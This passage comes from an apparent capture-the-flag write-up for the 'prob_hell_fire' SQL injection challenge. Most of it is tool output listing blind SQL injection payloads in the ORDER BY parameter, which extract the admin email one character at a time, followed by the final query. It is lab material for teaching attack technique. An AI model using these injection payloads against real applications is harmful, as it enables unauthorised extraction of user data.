[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+15%2C+1%29%29%3D%27109%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 15: m

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 16, 1))='97', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+16%2C+1%29%29%3D%2797%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 16: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 17, 1))='105', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+17%2C+1%29%29%3D%27105%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 17: i

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 18, 1))='108', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+18%2C+1%29%29%3D%27108%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 18: l

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 19, 1))='64', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+19%2C+1%29%29%3D%2764%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 19: @

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 20, 1))='101', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+20%2C+1%29%29%3D%27101%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 20: e

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 21, 1))='109', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+21%2C+1%29%29%3D%27109%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 21: m

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 22, 1))='97', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+22%2C+1%29%29%3D%2797%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 22: a

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 23, 1))='105', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+23%2C+1%29%29%3D%27105%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 23: i

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 24, 1))='49', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+24%2C+1%29%29%3D%2749%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 24: 1

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 25, 1))='46', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+25%2C+1%29%29%3D%2746%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 25: .

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 26, 1))='99', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+26%2C+1%29%29%3D%2799%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 26: c

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 27, 1))='111', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+27%2C+1%29%29%3D%27111%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 27: o

[+] Payload: ?order=if(id='admin' AND ord(substr(email, 28, 1))='109', '1 ASC', '1 DESC')
[+] Payload (URL encoded): ?order=if%28id%3D%27admin%27+AND+ord%28substr%28email%2C+28%2C+1%29%29%3D%27109%27%2C+%271+ASC%27%2C+%271+DESC%27%29
[+] Character at index 28: m

[!] Extracted email: admin_secure_email@emai1.com
[!] Final payload: ?email=admin_secure_email@emai1.com
```

If we provide the following URI parameter:

```
?email=admin%5Fsecure%5Femail@emai1.com
```

The resultant query becomes:

```sql
SELECT email FROM prob_hell_fire WHERE id='admin' AND email='admin_secure_email@emai1.com'
```

![0](https://github.com/Kunull/Write-ups/assets/110326359/844f62d9-030e-4a60-b0b5-3f85e8031906)
